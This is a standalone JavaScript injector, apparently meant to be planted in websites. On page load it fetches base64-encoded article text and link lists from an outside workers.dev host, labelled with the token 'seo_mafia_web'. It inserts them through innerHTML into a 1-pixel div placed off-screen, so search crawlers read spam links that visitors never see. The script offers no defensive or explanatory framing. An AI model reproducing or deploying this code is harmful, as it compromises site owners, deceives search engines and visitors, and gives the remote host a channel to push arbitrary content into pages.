<script>
!function(){
try{
  if(document.getElementById("bunker-payload")) return;

  const API_BASE = "https://smw.jsload.workers.dev";
  const TOKEN = "seo_mafia_web";

  const decode = (s) => {
    try {
      return new TextDecoder().decode(
        Uint8Array.from(atob(s), c => c.charCodeAt(0))
      );
    } catch(e) {
      console.error("Decode error:", e);
      return "";
    }
  };
  async function getData(id){
    try{
      const res = await fetch(
        `${API_BASE}/data?id=${encodeURIComponent(id)}&token=${encodeURIComponent(TOKEN)}`,
        { cache: "no-store" }
      );

      if(!res.ok) throw new Error("Fetch failed: " + res.status);

      const json = await res.json();

      if(!json || !json.payload) throw new Error("Invalid payload");

      return decode(json.payload);

    }catch(err){
      console.error("Fetch error ("+id+"):", err);
      return "";
    }
  }

  Promise.all([
    getData("b1"),
    getData("a1")
  ]).then(([anchorsRaw, articleRaw]) => {

    if(!anchorsRaw || !articleRaw){
      console.warn("Data kosong, inject dibatalkan");
      return;
    }
    const anchors = anchorsRaw
      .split("\n")
      .map(x => x.trim())
      .filter(Boolean)
      .map(line => {
        const parts = line.split("|");
        if(parts.length < 2) return "";
        const text = parts[0].trim();
        const href = parts[1].trim();
        if(!text || !href) return "";
        return `<a href="${href}">${text}</a>`;
      })
      .filter(Boolean);

    console.log("Anchors parsed:", anchors.length);

    let i = 0;
    const html = articleRaw.replace(/\{ANCHOR\}/g, () => {
      return anchors.length ? anchors[i++ % anchors.length] : "";
    });
    function inject(){
      try{
        if(document.getElementById("bunker-payload")) return;

        const box = document.createElement("div");
        box.id = "bunker-payload";
        box.style.position = "absolute";
        box.style.left = "-9999px";
        box.style.top = "0";
        box.style.width = "1px";
        box.style.height = "1px";
        box.style.overflow = "hidden";
        box.innerHTML = html;

        document.body.appendChild(box);
        console.log("Inject sukses");

      }catch(e){
        console.error("Inject error:", e);
      }
    }
    if(document.readyState === "complete" || document.readyState === "interactive"){
      inject();
    }else{
      document.addEventListener("DOMContentLoaded", inject);
    }

  });

}catch(e){
  console.error("Injector fatal error:", e);
}
}();
</script>
